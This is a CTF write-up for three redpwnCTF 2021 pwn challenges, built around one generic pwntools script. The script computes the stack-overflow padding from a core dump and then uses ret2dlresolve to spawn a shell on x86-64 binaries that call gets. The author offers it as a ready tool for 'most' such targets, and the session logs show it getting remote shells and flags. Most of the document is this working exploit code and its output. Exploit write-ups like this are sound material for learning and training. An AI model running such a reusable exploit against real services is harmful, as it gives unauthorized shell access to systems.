# redpwnCTF 2021

## beginner-generic-pwn-number-0/ret2generic-flag-reader/ret2the-unknown

> **beginner-generic-pwn-number-0**  
> pepsipu
> 
> rob keeps making me write beginner pwn! i'll show him...
>
> `nc mc.ax 31199`
>
> [beginner-generic-pwn-number-0](beginner-generic-pwn-number-0)
> 
> **ret2generic-flag-reader**  
> pepsipu
> 
> i'll ace this board meeting with my new original challenge!
>
> `nc mc.ax 31077`
>
> [ret2generic-flag-reader](ret2generic-flag-reader)
> 
> **ret2the-unknown**  
> pepsipu
>
> hey, my company sponsored map doesn't show any location named "libc"!
>
> `nc mc.ax 31568`
>
> [ret2the-unknown](ret2the-unknown)


Tags: _pwn_ _x86-64_ _ret2dlresolve_ _bof_


## Summary

I'm lumping all of these together since I used the _exact_ same code on all of them.  And I'm sure this was _not_ the intended solution.

I'm not going to cover all the internals or details of ret2dlresolve (in this write up, I'm working on a future article), however here are two good reads:

[https://syst3mfailure.io/ret2dl_resolve](https://syst3mfailure.io/ret2dl_resolve)  
[https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    Stack:    No canary found
    PIE:      No PIE (0x400000)
```

All three had at least the above--all that is needed for easy ret2dlresolve with `gets`.  That and dynamically linked.

> Perhaps it's time to retire `gets`.


## Exploit (./getsome.py)

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF(args.BIN)

p = process(binary.path)
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8),n=8)
log.info('padding: ' + hex(padding))

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]
dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process(binary.path)

payload  = b''
payload += padding * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()
```

To exploit most x86_64 `gets` challenges just type:

`./getsome.py BIN=./binary HOST=host PORT=port REMOTE=1`

Thanks it, get your flag and move on.

_How does this script work?_

Well, first the padding is computing by crashing the binary and extracting the payload from the core to compute the distance to the return address on the stack.  Then, ret2dlresolve is used to get a shell.  _See the retdlresolve links above._


Output:

```bash
# ./getsome.py BIN=./beginner-generic-pwn-number-0 HOST=mc.ax PORT=31199 REMOTE=1
[*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0': pid 265
[*] Process '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' stopped with exit code -11 (SIGSEGV) (pid 265)
[!] Error parsing corefile stack: Found bad environment at 0x7fffed221f4f
[+] Parsing corefile...: Done
[*] '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/core.265'
    Arch:      amd64-64-little
    RIP:       0x4012be
    RSP:       0x7fffed2205b8
    Exe:       '/pwd/datajerk/redpwnctf2021/pwn/beginner-generic-pwn-number-0/beginner-generic-pwn-number-0' (0x400000)
    Fault:     0x6161616161616168
[*] padding: 0x38
[*] Loaded 14 cached gadgets for './beginner-generic-pwn-number-0'
[+] Opening connection to mc.ax on port 31199: Done
[*] Switching to interactive mode
"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
$ cat flag.txt
flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
```

```bash
# ./getsome.py BIN=./ret2generic-flag-reader HOST=mc.ax PORT=31077 REMOTE=1
[*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader': pid 312
[*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' stopped with exit code -11 (SIGSEGV) (pid 312)
[!] Error parsing corefile stack: Found bad environment at 0x7fffe4f21f61
[+] Parsing corefile...: Done
[*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/core.312'
    Arch:      amd64-64-little
    RIP:       0x40142f
    RSP:       0x7fffe4f20028
    Exe:       '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' (0x400000)
    Fault:     0x6161616161616166
[*] padding: 0x28
[*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader'
[+] Opening connection to mc.ax on port 31077: Done
[*] Switching to interactive mode
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
$ cat flag.txt
flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
```

```bash
# ./getsome.py BIN=./ret2the-unknown HOST=mc.ax PORT=31568 REMOTE=1
[*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown': pid 361
[*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' stopped with exit code -11 (SIGSEGV) (pid 361)
[!] Error parsing corefile stack: Found bad environment at 0x7ffcd8878f79
[+] Parsing corefile...: Done
[*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/core.361'
    Arch:      amd64-64-little
    RIP:       0x401237
    RSP:       0x7ffcd8876cf8
    Exe:       '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' (0x400000)
    Fault:     0x6161616161616166
[*] padding: 0x28
[*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown'
[+] Opening connection to mc.ax on port 31568: Done
[*] Switching to interactive mode
that board meeting was a *smashing* success! rob loved the challenge!
in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...
where is this place? can you help me get there safely?
phew, good to know. shoot! i forgot!
rob said i'd need this to get there: 7f6564131560
good luck!
$ cat flag.txt
flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}
```
